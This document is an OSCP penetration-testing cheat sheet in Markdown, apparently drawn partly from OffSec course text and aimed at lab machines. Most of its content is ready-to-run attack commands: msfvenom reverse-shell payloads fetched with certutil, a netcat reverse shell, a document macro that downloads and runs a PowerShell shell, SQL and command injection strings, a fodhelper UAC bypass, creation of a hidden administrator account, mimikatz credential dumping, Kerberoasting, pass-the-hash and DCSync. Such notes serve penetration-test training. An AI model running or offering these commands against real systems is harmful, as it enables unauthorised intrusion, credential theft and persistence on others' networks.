# OSCP Cheat Sheet <img src="https://media.giphy.com/media/M9gbBd9nbDrOTu1Mqx/giphy.gif" width="100"/>

## Service Enumeration <img src="https://cdn-icons-png.flaticon.com/512/6989/6989458.png" width="40" height="40" />
### Network Enumeration
````
nmap -p- --min-rate 1000 $IP
nmap -p- --min-rate 1000 $IP -Pn #disables the ping command and only scans ports
````
````
nmap -p <ports> -sV -sC -A $IP
````
````
copy me
````
### Port Enumeration
#### HTTP(S) port 80,443
##### FingerPrinting
````
whatweb -a 3 $IP
nikto -ask=no -h http://$IP 2>&1
````
##### Directory Busting
##### Dirb
````
dirb http://target.com
````
###### gobuster
````
gobuster dir -u http://10.11.1.71:80/site/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e txt,php,html,htm
gobuster dir -u http://10.11.1.71:80/site/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,php,html,htm
````
###### feroxbuster
````
feroxbuster -u http://<$IP> -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -o 
````



#### MSRPC port 135
#### SMB port 139,445
Port 139
NetBIOS stands for Network Basic Input Output System. It is a software protocol that allows applications, PCs, and Desktops on a local area network (LAN) to communicate with network hardware and to transmit data across the network. Software applications that run on a NetBIOS network locate and identify each other via their NetBIOS names. A NetBIOS name is up to 16 characters long and usually, separate from the computer name. Two applications start a NetBIOS session when one (the client) sends a command to “call” another client (the server) over TCP Port 139. (extracted from here)

Port 445
While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.
##### Enumeration
nmap
````
nmap --script smb-enum-shares.nse -p445 $IP
nmap –script smb-enum-users.nse -p445 $IP
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 $IP
nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p445 $IP
````
smbmap
````
smbmap -H $IP
smbmap -u "user" -p "pass" -H $IP
smbmap -H $IP -u null
smbmap -H $IP -P 139 2>&1
smbmap -H $IP -P 445 2>&1
smbmap -u null -p "" -H $IP -P 139 -x "ipconfig /all" 2>&1
smbmap -u null -p "" -H $IP -P 445 -x "ipconfig /all" 2>&1
````
rpcclient
````
rpcclient -U "" -N $IP
````
enum4linux
````
enum4linux -a -M -l -d $IP 2>&1
enum4linux -a -u "" -p "" 192.168.180.71 && enum4linux -a -u "guest" -p "" $IP
````
crackmapexec
````
crackmapexec smb $IP
crackmapexec smb $IP -u "guest" -p ""
crackmapexec smb $IP --shares -u "" -p ""
````

#### RDP port 3389
##### Enumeration
````
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 $IP -Pn
````
##### Password Spray
````
crowbar -b rdp -s 10.11.1.7/32 -U users.txt -C rockyou.txt
````


## Web Pentest <img src="https://cdn-icons-png.flaticon.com/512/1304/1304061.png" width="40" height="40" />
### Command Injection
#### DNS Querying Service
For background the DNS Querying Service is running nslookup and then querying the output. The way we figured this out was by inputing our own IP and getting back an error that is similar to one that nslookup would produce. With this in mind we can add the && character to append another command to the query:
````
&& whoami
````

<img src="https://user-images.githubusercontent.com/127046919/223560695-218399e2-2447-4b67-b93c-caee8e3ee3df.png" width="250" height="240" />

### Command Injection RCE
#### DNS Querying Service
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
python3 -m http.server 80
&& certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
nc -nlvp 80
&& cmd /c C:\\Windows\\temp\\shell.exe
````
### SQL Injection
Background information on sqli: scanning the network for different services that may be installed. A mariaDB was installed however the same logic can be used depending on what services are running on the network
### Research Repo MariaDB
<img src="https://user-images.githubusercontent.com/127046919/224163239-b67fbb66-e3b8-4ea4-8437-d0fe2839a166.png" width="250" height="240" />

````
admin ' OR 1=1 --
````
````
1' OR 1 = 1#
````
### SSRF
SSRF vulnerabilities occur when an attacker has full or partial control of the request sent by the web application. A common example is when an attacker can control the third-party service URL to which the web application makes a request.

<img src="https://user-images.githubusercontent.com/127046919/224167289-d416f6b0-f256-4fd8-b7c2-bcdc3c474637.png" width="250" height="240" />

````
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.146.172 - - [09/Mar/2023 16:39:17] code 404, message File not found
192.168.146.172 - - [09/Mar/2023 16:39:17] "GET /test.html HTTP/1.1" 404 -
````
````
http://192.168.119.146/test.html
http://192.168.119.146/test.hta
````
## Exploitation <img src="https://cdn-icons-png.flaticon.com/512/2147/2147286.png" width="40" height="40" />
### Windows rce techniques
````
locate nc.exe
smbserver.py -smb2support Share .
nc -nlvp 80
cmd.exe /c //<your kali IP>/Share/nc.exe -e cmd.exe <your kali IP> 80
````
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
python3 -m http.server 80
certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
cmd /c C:\\Windows\\temp\\shell.exe
````
### HTA Attack in Action
We will use msfvenom to turn our basic HTML Application into an attack, relying on the hta-psh output format to create an HTA payload based on PowerShell. In Listing 11, the complete reverse shell payload is generated and saved into the file evil.hta.
````
msfvenom -p windows/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil.hta
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil64.hta
````
### Exploiting Microsoft Office
When leveraging client-side vulnerabilities, it is important to use applications that are trusted by the victim in their everyday line of work. Unlike potentially suspicious-looking web links, Microsoft Office1 client-side attacks are often successful because it is difficult to differentiate malicious content from benign. In this section, we will explore various client-side attack vectors that leverage Microsoft Office applications
#### Microsoft Word Macro
The Microsoft Word macro may be one the oldest and best-known client-side software attack vectors.

Microsoft Office applications like Word and Excel allow users to embed macros, a series of commands and instructions that are grouped together to accomplish a task programmatically. Organizations often use macros to manage dynamic content and link documents with external content. More interestingly, macros can be written from scratch in Visual Basic for Applications (VBA), which is a fully functional scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.
````
(open) LibreOffice Writer
Tools > Macros > Organize Macros > Basic
New
Enter These commands:
REM  *****  BASIC  *****

Sub MyMacro()
'
' cmd /c powershell iwr http://<your ip>/rev.ps1 - o C:/Windows/Tasks/rev.ps1
' cmd /c powershell -c C:/Windows/Tasks/rev.ps1
'
End Sub
````
````
tools > organize > Events > Open Document > Macro > (find your macro and attach it)
````
<img src="https://user-images.githubusercontent.com/127046919/224577298-3aaaf97f-e340-4ef8-a593-b24168ee8cd2.png" width="250" height="240" />

````
vim rev.ps1
chmod 755 rev.ps1
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1 > rev.ps1
upload File with Macro to vulnerable website #Evil.odt
setup listner and webserver
````
#### Object Linking and Embedding
Another popular client-side attack against Microsoft Office abuses Dynamic Data Exchange (DDE)1 to execute arbitrary applications from within Office documents, but this has been patched since December of 2017. In this attack scenario, we are going to embed a Windows batch file5 inside a Microsoft Word document.
### Hashing & Cracking
#### Enumeration
````
hashid <paste your hash here>
````
````
https://hashcat.net/wiki/doku.php?id=example_hashes
````
#### Cracking hashes
````
https://crackstation.net/
````
````
hashcat -m <load the hash mode> hash.txt /usr/share/wordlists/rockyou.txt
````
````
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
````
#### Cracking Zip files
````
unzip <file>
unzip bank-account.zip 
Archive:  bank-account.zip
[bank-account.zip] bank-account.xls password: 
````
````
zip2john file.zip zip.txt
john --wordlist=/usr/share/wordlists/rockyou.txt zip.txt
````
### Logging in/Changing users
#### rdp
````
rdesktop -u 'Nathan' -p 'abc123//' 192.168.129.59 -g 94% -d OFFSEC
````
## Buffer Overflow <img src="https://w7.pngwing.com/pngs/331/576/png-transparent-computer-icons-stack-overflow-encapsulated-postscript-stacking-angle-text-stack-thumbnail.png" width="40" height="40" />

## MSFVENOM
### Windows 64 bit
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
````
## File Transfer <img src="https://cdn-icons-png.flaticon.com/512/1037/1037316.png" width="40" height="40" />
### SMB Linux to Windows
````
smbserver.py -smb2support Share .
cmd.exe /c //<your kali IP>/Share/<file name you want>
````
````
/usr/local/bin/smbserver.py -username df -password df share . -smb2support
net use \\<your kali IP>\share /u:df df
copy \\<your kali IP>\share\<file wanted>
````
````
smbserver.py -smb2support Share .
net use \\<your kali IP>\share
copy \\<your kali IP>\share\whoami.exe
````
### Windows http server Linux to Windows
````
python3 -m http.server 80
certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
````
### SMB Server Bi-directional
````
smbserver.py -smb2support Share .
mkdir loot #transfering loot to this folder
net use * \\192.168.119.183\share
copy Z:\<file you want from kali>
copy C:\bank-account.zip Z:\loot #Transfer files to the loot folder on your kali machine
````

### PHP Script Windows to Linux
````
cat upload.php
chmod +x upload.php
````
````
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
````
````
sudo mkdir /var/www/uploads
````
````
mv upload.php /var/www/uploads
````
````
service apache2 start
ps -ef | grep apache
`````
````
powershell (New-Object System.Net.WebClient).UploadFile('http://<your Kali ip>/upload.php', '<file you want to transfer>')
````
````
service apache2 stop
````

## Linux System Enumeration <img src="https://cdn-icons-png.flaticon.com/512/546/546049.png" width="40" height="40" />

## Windows System Enumeration <img src="https://cdn-icons-png.flaticon.com/512/232/232411.png" width="40" height="40" />
### Windows Binaries
````
sudo apt install windows-binaries
````
### Basic Enumeration of the System
````
# Basics
systeminfo
hostname

# Who am I?
whoami
echo %username%

# What users/localgroups are on the machine?
net users
net localgroups

# More info about a specific user. Check if user has privileges.
net user user1

# View Domain Groups
net group /domain

# View Members of Domain Group
net group /domain <Group Name>

# Firewall
netsh firewall show state
netsh firewall show config

# Network
ipconfig /all
route print
arp -A

# How well patched is the system?
wmic qfe get Caption,Description,HotFixID,InstalledOn
````
### Clear text passwords
````
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
````
````
dir /s /p proof.txt
````

## Shell <img src="https://cdn-icons-png.flaticon.com/512/5756/5756857.png" width="40" height="40" />
### Linux
````
which python
which python2
which python3
python -c ‘import pty; pty.spawn(“/bin/bash”)’
````
````
which socat
socat file:`tty`,raw,echo=0 tcp-listen:4444 #On Kali Machine
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.49.71:4444 #On Victim Machine
````
### Windows
This helps to create a more stable shell, upload nc32.exe or nc64.exe and catch a rever shell back to your kali machine
````
nc -nlvp 9001
.\nc.exe <your kali IP> 9001 -e cmd
````

## Port Forwarding/Tunneling <img src="https://cdn-icons-png.flaticon.com/512/3547/3547287.png" width="40" height="40" />
### Tools
#### rinetd Port Fowarding
````
sudo apt update && sudo apt install rinetd
````
````
cat /etc/rinetd.conf
````
````
# forwarding rules come here
#
# you may specify allow and deny rules after a specific forwarding rule
# to apply to only that forwarding rule
#
# bindadress    bindport  
# connectaddress  connectport
````
````
# bindadress bindport  connectaddress  connectport
  0.0.0.0    80        216.58.207.142  80
````
````
sudo service rinetd restart
````
#### SSH Tunneling
Accessing Windows SMB Shares
````
sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
````
````
kali@kali:~$ sudo vim /etc/samba/smb.conf 

kali@kali:~$ cat /etc/samba/smb.conf 
...
Please note that you also need to set appropriate Unix permissions
# to the drivers directory for these users to have write rights in it
;   write list = root, @lpadmin

min protocol = SMB2
````
````
sudo /etc/init.d/smbd restart
````
````
smbclient -L 127.0.0.1 -U Administrator
````
Accessing Port 80 locally
````
ssh -L 80:0.0.0.0:80 student@192.168.146.52 -p 2222
````
Reverse Tunelling
````
ssh -N -R [bind_address:]port:host:hostport [username@address]
````
Reverse Tunelling from victim kali machine open port 2221 to mysql port 3306
````
ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
````
Compromised machine is making a reverse shell back to 127.0.0.1:5555 foward that to our local machine
````
ssh -N -R 5555:127.0.0.1:5555 student@192.168.129.52 -p 2222
````
````
nc -nlvp 5555
````
SSH Dynamic Port Fowarding
````
ssh -N -D 127.0.0.1:8080 student@$IP
````
````
cat /etc/proxychains.conf

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 8080 
````
````
proxychains nmap --top-ports=20 -sT -Pn 127.0.0.1
````
non-root user
````
proxychains4 firefox http://127.0.0.1/
````
````
proxychains wpscan --url http://127.0.0.1:80/ --usernames usernames.txt --passwords /usr/share/wordlists/rockyou.txt
````
#### Windows Tunneling/Port Fowarding w/plink.exe
Check open network connections to port foward
````
netstat -anpb TCP
````
Option 1
````
plink.exe -ssh -l kali -pw ilak -R <your kali IP>:1234:127.0.0.1:3306 <your kali IP>
````
Option 2
````
cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R <your kali IP>:1234:127.0.0.1:3306 <your kali IP>
````
Re-scan network
````
sudo nmap -sS -sV 127.0.0.1 -p 1234
````
#### NETSH
Compromised System Access Windows 10 machine 10.11.0.22 an additional network interface 192.168.1.110
````
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
````
````
netstat -anp TCP | find "4455"
````
(Only System User Can Run)
````
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
````
````
sudo vim /etc/samba/smb.conf
cat /etc/samba/smb.conf
````
````
Please note that you also need to set appropriate Unix permissions
# to the drivers directory for these users to have write rights in it
;   write list = root, @lpadmin

min protocol = SMB2
````
````
sudo /etc/init.d/smbd restart
````
connect via smbclient and then mount shares to your local machine
````
smbclient -L 10.11.0.22 --port=4455 --user=Administrator
````
## Compiling Exploit Codes <img src="https://cdn-icons-png.flaticon.com/128/868/868786.png" width="40" height="40" />

## Linux PrivEsc <img src="https://vangogh.teespring.com/v3/image/7xjTL1mj6OG1mj5p4EN_d6B1zVs/800/800.jpg" width="40" height="40" />

## Windows PrivEsc <img src="https://vangogh.teespring.com/v3/image/9YwsrdxKpMa_uTATdBk8_wFGxmE/1200/1200.jpg" width="40" height="40" />
### User Account Control (UAC) Bypass
UAC can be bypassed in various ways. In this first example, we will demonstrate a technique that
allows an administrator user to bypass UAC by silently elevating our integrity level from medium
to high. As we will soon demonstrate, the fodhelper.exe509 binary runs as high integrity on Windows 10
1709. We can leverage this to bypass UAC because of the way fodhelper interacts with the
Windows Registry. More specifically, it interacts with registry keys that can be modified without
administrative privileges. We will attempt to find and modify these registry keys in order to run a
command of our choosing with high integrity
````
whoami /groups #check your integrity level/to get high integrity level to be able to run mimikatz and grab those hashes  
````
````
C:\Windows\System32\fodhelper.exe #32 bit
C:\Windows\SysNative\fodhelper.exe #64 bit
````
Launch Powershell and run the following
````
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\Users\ted\shell.exe" -Force
````
run fodhelper setup and nc shell and check your priority
````
C:\Windows\System32\fodhelper.exe
````
### Leveraging Unquoted Service Paths
Another interesting attack vector that can lead to privilege escalation on Windows operating systems revolves around unquoted service paths.1 We can use this attack when we have write permissions to a service's main directory and subdirectories but cannot replace files within them. Please note that this section of the module will not be reproducible on your dedicated client. However, you will be able to use this technique on various hosts inside the lab environment.

As we have seen in the previous section, each Windows service maps to an executable file that will be run when the service is started. Most of the time, services that accompany third party software are stored under the C:\Program Files directory, which contains a space character in its name. This can potentially be turned into an opportunity for a privilege escalation attack.

````
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v """
````
In this example we see than ZenHelpDesk is in program files as discussed before and has an unqouted path.
````
C:\Users\ted>wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v """
mysql                                                                               mysql                                     C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql                          Auto       
ZenHelpDesk                                                                         Service1                                  C:\program files\zen\zen services\zen.exe                                                              Auto       

C:\Users\ted>
````
check our permission and chech which part of the path you have write access to.
````
dir /Q
dir /Q /S
````
````
C:\Program Files\Zen>dir /q
 Volume in drive C has no label.
 Volume Serial Number is 3A47-4458

 Directory of C:\Program Files\Zen

02/15/2021  02:00 PM    <DIR>          BUILTIN\Administrators .
02/15/2021  02:00 PM    <DIR>          NT SERVICE\TrustedInsta..
02/10/2021  02:24 PM    <DIR>          BUILTIN\Administrators Zen Services
03/10/2023  12:05 PM             7,168 EXAM\ted               zen.exe
               1 File(s)          7,168 bytes
               3 Dir(s)   4,013,879,296 bytes free
````
Next we want to create a msfvenom file for a reverse shell and upload it to the folder where we have privledges over a file to write to. Start your netcat listner and check to see if you have shutdown privledges
````
sc stop "Some vulnerable service" #if you have permission proceed below
sc start "Some vulnerable service"#if the above worked then start the service again
sc qc "Some vulnerable service" #if the above failed check the privledges above "SERVICE_START_NAME"
whoami /priv #if the above failed check to see if you have shutdown privledges
shutdown /r /t 0 #wait for a shell to comeback
````
### Adding a user with high privs
````
net user hacker password /add
net localgroup Administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
net users #check the new user
````
````
impacket-secretsdump hacker:password@<IP of victim machine> -outputfile hashes 
rdekstop -u hacker -p password <IP of victim machine>
````
## Active Directory <img src="https://www.outsystems.com/Forge_CW/_image.aspx/Q8LvY--6WakOw9afDCuuGXsjTvpZCo5fbFxdpi8oIBI=/active-directory-core-simplified-2023-01-04%2000-00-00-2023-02-07%2007-43-45" width="40" height="40" />

### Active Directory Enumeration <img src="https://cdn-icons-png.flaticon.com/512/9616/9616012.png" width="40" height="40" />
#### Traditional Approach
````
net user #users on current computer
````
````
net user /domain #users in the current domain
````
````
net user <user>_admin /domain #Look for specific users on the domain
````
````
net group /domain #global groups in domains
````
```
net group "Domain Computers" /domain #All workstations and servers joined to the domain
````
````
net group "domain controllers" /domain #This is the domain controller you want to reach
````
### Active Directory Credential Hunting <img src="https://cdn-icons-png.flaticon.com/512/1176/1176601.png" width="40" height="40" />
#### cached storage credential attacks <img src="https://cdn-icons-png.flaticon.com/128/1486/1486513.png" width="40" height="40" />
Since Microsoft's implementation of Kerberos makes use of single sign-on, password hashes must be stored somewhere in order to renew a TGT request. In current versions of Windows, these hashes are stored in the Local Security Authority Subsystem Service (LSASS)1 memory space. If we gain access to these hashes, we could crack them to obtain the cleartext password or reuse them to perform various actions.

##### MimiKatz <img src="https://cdn-icons-png.flaticon.com/128/1864/1864514.png" width="40" height="40" /> 
````
https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
````
````
unzip mimikatz_trunk.zip 
````
````
cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe .
````
````
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
````
````
privilege::debug
````
````
sekurlsa::logonpasswords
````
Notice that we have two types of hashes highlighted in the output above. This will vary based on the functional level of the AD implementation. For AD instances at a functional level of Windows 2003, NTLM is the only available hashing algorithm. For instances running Windows Server 2008 or later, both NTLM and SHA-1 (a common companion for AES encryption) may be available. On older operating systems like Windows 7, or operating systems that have it manually set, WDigest,9 will be enabled. When WDigest is enabled, running Mimikatz will reveal cleartext password alongside the password hashes.

SEKURLSA::Tickets – Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer’s AD computer account.
Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users).

Dumps all authenticated Kerberos tickets on a system.
Requires administrator access (with debug) or Local SYSTEM rights
````
sekurlsa::tickets
````
A different approach and use of Mimikatz is to exploit Kerberos authentication by abusing TGT and service tickets. As already discussed, we know that Kerberos TGT and service tickets for users currently logged on to the local machine are stored for future use. These tickets are also stored in LSASS and we can use Mimikatz to interact with and retrieve our own tickets and the tickets of other local users.

The output shows both a TGT and a TGS. Stealing a TGS would allow us to access only particular resources associated with those tickets. On the other side, armed with a TGT ticket, we could request a TGS for specific resources we want to target within the domain. We will discuss how to leverage stolen or forged tickets later on in the module.
#### Service Account Attacks <img src="https://cdn-icons-png.flaticon.com/128/720/720234.png" width="40" height="40" />
Recalling the explanation of the Kerberos protocol, we know that when the user wants to access a resource hosted by a SPN, the client requests a service ticket that is generated by the domain controller. The service ticket is then decrypted and validated by the application server, since it is encrypted through the password hash of the SPN.

When requesting the service ticket from the domain controller, no checks are performed on whether the user has any permissions to access the service hosted by the service principal name. These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller. Then, since it is our own ticket, we can extract it from local memory and save it to disk.
##### PowerView Enumeration
````
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
````
````
import-module .\PowerView.ps1
````
````
Get-NetUser -SPN #Kerberoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Find-LocalAdminAccess #Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
````
##### Rubeus Exploitation
When we ran Rubeus it triggered a Keberos Auth request and we were able to use mimikatz after to get the ticket as well.
````
cp /opt/Ghostpack-CompiledBinaries/Rubeus.exe .
````
````
.\Rubeus.exe kerberoast /simple /outfile:hashes.txt
type hashes.txt
````
##### MimiKatz <img src="https://cdn-icons-png.flaticon.com/128/1864/1864514.png" width="40" height="40" /> 
````
https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
````
````
unzip mimikatz_trunk.zip 
````
````
cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe .
````
````
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
````
To download the service ticket with Mimikatz, we use the kerberos::list command, which yields the equivalent output of the klist command above. We also specify the /export flag to download to disk as shown in Listing 33.
````
kerberos::list /export
`````
##### kerberoast Exploitation
````
sudo apt update && sudo apt install kerberoast
````
````
python /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
````
````
rdesktop -u 'Allison' -p 'RockYou!' 192.168.129.59 -g 94% -d OFFSEC
````
##### Powershell
This lists current cached tickets
````
klist
````
#### Credential Dumping SAM
SAM is short for the Security Account Manager which manages all the user accounts and their passwords. It acts as a database. All the passwords are hashed and then stored SAM. It is the responsibility of LSA (Local Security Authority) to verify user login by matching the passwords with the database maintained in SAM. SAM starts running in the background as soon as the Windows boots up. SAM is found in C:\Windows\System32\config and passwords that are hashed and saved in SAM can found in the registry, just open the Registry Editor and navigate yourself to HKEY_LOCAL_MACHINE\SAM.
````
whoami /all #BUILTIN\Administrators
````
````
#cmd.exe
reg save hklm\sam c:\sam
reg save hklm\system c:\system
````
````
python3 /home/kali/Downloads/impacket-0.9.20/examples/secretsdump.py 'OFFSEC/Allison:RockYou!@192.168.129.59'
systeminfo #DC01
````
### Active Directory Lateral Movement <img src="https://cdn-icons-png.flaticon.com/512/9760/9760046.png" width="40" height="40" />
#### Pass the Hash <img src="https://cdn-icons-png.flaticon.com/128/6107/6107027.png" width="40" height="40" /> <img src="https://cdn-icons-png.flaticon.com/128/6050/6050858.png" width="40" height="40" />
The Pass the Hash (PtH) technique allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password. Note that this will not work for Kerberos authentication but only for server or service using NTLM authentication.
````
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 Administrator@192.168.129.59
````
#### Overpass the Hash <img src="https://cdn-icons-png.flaticon.com/128/9513/9513588.png" width="40" height="40" /> <img src="https://cdn-icons-png.flaticon.com/128/5584/5584500.png" width="40" height="40" /> 
With overpass the hash,1 we can "over" abuse a NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket, which grants us access to another machine or service as that user.
````
privilege::debug
sekurlsa::logonpasswords
````
````
sekurlsa::pth /user:zensvc /domain:exam.com /ntlm:d098fa8675acd7d26ab86eb2581233e5 /run:PowerShell.exe
````
````
exit
klist
````
````
net group "domain controllers" /domain
The request will be processed at a domain controller for domain exam.com.

Group name     Domain Controllers
Comment        All domain controllers in the domain

Members

-------------------------------------------------------------------------------
DC02$                    
The command completed successfully.
````
````
net use \\dc02.exam.com
````
We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM) such as the official PsExec application from Microsoft. PsExec can run a command remotely but does not accept password hashes. Since we have generated Kerberos tickets and operate in the context of Jeff_Admin in the PowerShell session, we may reuse the TGT to obtain code execution on the domain controller.

Let's try that now, running ./PsExec.exe to launch cmd.exe remotely on the \dc01 machine as Jeff_Admin:
````
https://github.com/EliteLoser/Invoke-PsExec/blob/master/PsExec.exe
cp /home/kali/Downloads/PsExec.exe .
python3 -m http.server 800
certutil -urlcache -split -f http://192.168.119.183:800/PsExec.exe
````
````
.\PsExec.exe \\dc02.exam.com cmd.exe
````

#### Pass the Ticket <img src="https://cdn-icons-png.flaticon.com/128/6009/6009553.png" width="40" height="40" /> <img src="https://cdn-icons-png.flaticon.com/128/3851/3851423.png" width="40" height="40" />
We can only use the TGT on the machine it was created for, but the TGS potentially offers more flexibility. The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.
#### Silver Ticket <img src="https://cdn-icons-png.flaticon.com/512/3702/3702979.png" width="40" height="40" />
However, with the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource with any permissions we desire. This custom-created ticket is known as a silver ticket1 and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all. Mimikatz can craft a silver ticket and inject it straight into memory through the (somewhat misleading) kerberos::golden2 command. We will explain this apparent misnaming later in the module.
#### Distributed Component Object Model (DCOM) <img src="https://cdn-icons-png.flaticon.com/128/1913/1913653.png" width="40" height="40" />
The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to Distributed Component Object Model (DCOM) for interaction between multiple computers over a network. DCOM objects related to Microsoft Office allow lateral movement, both through the use of Outlook7 as well as PowerPoint.8 Since this requires the presence of Microsoft Office on the target computer, this lateral movement technique is best leveraged against workstations.
#### Golden Ticket <img src="https://cdn-icons-png.flaticon.com/128/7505/7505544.png" width="40" height="40" /> 
Going back to the explanation of Kerberos authentication, we recall that when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is actually the password hash of a domain user account called krbtgt.1

If we are able to get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, or golden tickets. t this stage of the engagement, we should have access to an account that is a member of the Domain Admins group or we have compromised the domain controller itself. With this kind of access, we can extract the password hash of the krbtgt account with Mimikatz.
#### Domain Controller Synchronization <img src="https://cdn-icons-png.flaticon.com/128/9405/9405206.png" width="40" height="40" /> 
To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user. We could also steal a copy of the NTDS.dit database file,1 which is a copy of all Active Directory accounts stored on the hard drive, similar to the SAM database used for local accounts.
````
lsadump::dcsync /all /csv #First run this to view all the dumpable hashes to be cracked or pass the hash
lsadump::dcsync /user:zensvc #Pick a user with admin rights to crack the password or pass the hash
````
````
Credentials:
  Hash NTLM: d098fa8675acd7d26ab86eb2581233e5
    ntlm- 0: d098fa8675acd7d26ab86eb2581233e5
    lm  - 0: 6ba75a670ee56eaf5cdf102fabb7bd4c
````
````
impacket-psexec -hashes 6ba75a670ee56eaf5cdf102fabb7bd4c:d098fa8675acd7d26ab86eb2581233e5 zensvc@192.168.183.170
````
